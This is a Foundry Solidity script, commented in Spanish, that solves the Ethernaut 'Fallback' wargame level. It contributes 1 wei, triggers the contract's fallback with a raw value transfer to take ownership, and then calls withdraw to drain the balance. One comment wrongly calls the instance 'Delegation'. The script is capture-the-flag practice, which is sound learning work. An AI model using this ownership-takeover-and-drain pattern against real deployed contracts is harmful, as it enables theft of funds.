// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut.sol";
import "../src/Fallback/Fallback.sol";

contract FallbackScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        // Fallback instance
        address instance = 0x4f49adB487C54748469B175e6D5D9d26495989d4; // TODO: Poner la direccion de la instancia del Delegation de ethernaut
        
        // Hacking
        Fallback(payable(instance)).contribute{value: 1}();

        (bool success, bytes memory data) = instance.call{value: 1}("");
        
        Fallback(payable(instance)).withdraw();
        
        // Llamar al ethernauta con la address de la instancia para validar
        // Ethernaut ethernaut = Ethernaut(0xD991431D8b033ddCb84dAD257f4821E9d5b38C33);
        // ethernaut.submitLevelInstance(payable(instance));

        vm.stopBroadcast();
    }
}